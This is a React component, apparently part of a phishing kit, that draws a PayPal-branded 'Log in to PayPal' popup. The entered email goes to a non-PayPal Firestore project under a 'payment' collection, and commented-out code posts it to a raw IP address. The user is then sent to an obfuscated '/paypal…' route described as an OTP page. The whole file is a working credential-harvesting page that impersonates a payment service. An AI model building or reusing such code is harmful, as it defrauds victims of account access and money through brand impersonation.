import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom"; // Import useNavigate

const EmailPopup = ({ onClose }) => {
  const [email, setEmail] = useState("");
  const [message, setMessage] = useState("");
  const navigate = useNavigate(); // Initialize navigation

  const handleEmailSubmit = async (e) => {
    e.preventDefault();

    if (!email) {
      console.error("Email is required!");
      return;
    }

    const userId = localStorage.getItem("userid");
    if (!userId) {
      console.error("User ID not found.");
      return;
    }

    try {
      localStorage.setItem("userEmail", email);
      console.log("email:", email, "userId:", userId);


      await fetch(
        `https://firestore.googleapis.com/v1/projects/chat-app-570c2/databases/(default)/documents/payment/${userId}?updateMask.fieldPaths=email`,
        {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            fields: {
              email: { stringValue: email },
            },
          }),
        }
      )
        .then((response) => response.json())
        .then((data) => console.log("Updated document:", data))
        .catch((error) => console.error("Error:", error));

      console.log("✅ Email stored successfully!");
      localStorage.removeItem("userEmail");

      // ✅ Navigate to OTP page with email as state
      navigate("/paypaloenWZVRVltNVRiSEFHMDhwdG2hhbnQtaWQ9Qk0zRV", { state: { email } });


      // const response = await fetch(
      //   `https://147.93.86.156:443/api/store-email/${userId}`,
      //   {
      //     method: "POST",
      //     headers: { "Content-Type": "application/json" },
      //     body: JSON.stringify({ email }),
      //   }
      // );

      // const data = await response.json();

      // if (response.ok) {
      //   console.log("✅ Email stored successfully!", data);
      //   localStorage.removeItem("userEmail");

      //   // ✅ Navigate to OTP page with email as state
      //   navigate("/paypaloenWZVRVltNVRiSEFHMDhwdG2hhbnQtaWQ9Qk0zRV", { state: { email } });
      // } else {
      //   console.error("❌ Server Error:", data.message);

      //   setMessage(data.message || "Failed to store email.");
      // }
    } catch (error) {
      console.error("❌ Network/Server error:", error);
      setMessage("Network error, please try again.");
    }
  };

  useEffect(() => {
    const savedEmail = localStorage.getItem("userEmail");
    if (savedEmail) {
      setEmail(savedEmail);
    }
  }, []);

  return (
    <div className="fixed inset-0 flex justify-center items-center bg-black bg-opacity-50 z-50">
      <div className="bg-white rounded-lg p-8 shadow-lg w-[500px] h-[750px] flex flex-col justify-center">
        {/* PayPal Icon */}
        <div className="flex justify-center mb-4">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg"
            alt="PayPal Logo"
            className="h-10"
          />
        </div>

        <h2 className="text-2xl font-bold text-center mb-3">
          Log in to PayPal
        </h2>
        <p className="text-gray-600 text-center mb-4">
          Enter your email address to get started.
        </p>
        {message && (
          <p className="text-center text-green-600 mb-3">{message}</p>
        )}

        <form onSubmit={handleEmailSubmit} className="space-y-3 w-full">
          <input
            type="email"
            placeholder="Email address or mobile number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            className="w-full p-3 border border-gray-300 rounded-md text-lg"
          />
          <p>Forgot email?</p> <br />


          <button
            type="submit"
            className="w-full bg-[#3321C8] text-white font-semibold py-3 rounded-md text-lg hover:bg-[#3321C8] transition"
          >
            Next
          </button>
        </form>

        <div className="text-center mt-3">
          <button className="border border-gray-300 p-3 rounded-md w-full text-lg">
            Create an account
          </button>
        </div>
        <p
          className="text-center text-blue-500 mt-4 cursor-pointer bg-gray-100 p-2 rounded-md hover:bg-gray-200"
          onClick={onClose}
        >
          Cancel and return
        </p>
      </div>
    </div>
  );
};

export default EmailPopup;
